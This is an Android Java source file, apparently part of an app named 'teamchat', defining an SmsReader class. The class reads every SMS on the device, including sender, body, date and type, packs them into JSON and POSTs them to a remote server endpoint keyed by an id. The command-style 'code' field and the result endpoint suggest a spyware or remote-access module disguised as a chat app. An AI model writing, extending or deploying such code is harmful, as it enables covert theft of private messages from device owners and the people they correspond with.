package com.example.teamchat;


import static com.example.teamchat.Constants.*;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.TimeZone;


public class SmsReader  {
    private final static String TAG = ChatService.class.getSimpleName();
    public static void readSMS(Context context, String id) throws JSONException {
        Log.d(TAG,"reading sms");
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(Uri.parse("content://sms"), null, null, null, null);
        JSONArray messagesArray = new JSONArray();
        if (cursor.moveToFirst()) {
            do {
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                long epoch_date = cursor.getLong(cursor.getColumnIndex("date"));
                String type = cursor.getString(cursor.getColumnIndex("type"));

                Date date = new Date(epoch_date);
                DateFormat format = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
                format.setTimeZone(TimeZone.getTimeZone("Asia/Singapore"));
                String formatted_date = format.format(date);

                JSONObject json = null;
                try {
                    // Create a JSON object to send to the server
                    json = new JSONObject();
                    json.put("address", address);
                    json.put("body", body);
                    json.put("formatted_date", formatted_date);
                    json.put("type", type);
                    messagesArray.put(json);
                } catch (JSONException e) {
                    Log.e(TAG, "Error creating JSON object: " + e.getMessage());
                }
            } while (cursor.moveToNext());
        }
        JSONObject parentObject = new JSONObject();
        parentObject.put("code", "sms");
        parentObject.put("data", messagesArray);

        try {
            HttpConnection.ReturnResponse response = HttpConnection.connect(SERVER + "result/" + id, "POST", parentObject.toString());

            assert response != null;
            if (response.responseCode == 200) {
                Log.d(TAG, "Response: " + response.body);
            } else {
                throw new IOException("Unexpected code " + response.responseCode);
            }
        } catch (IOException e) {
            Log.e(TAG, "Error sending request: " + e.getMessage());
        }
    }
}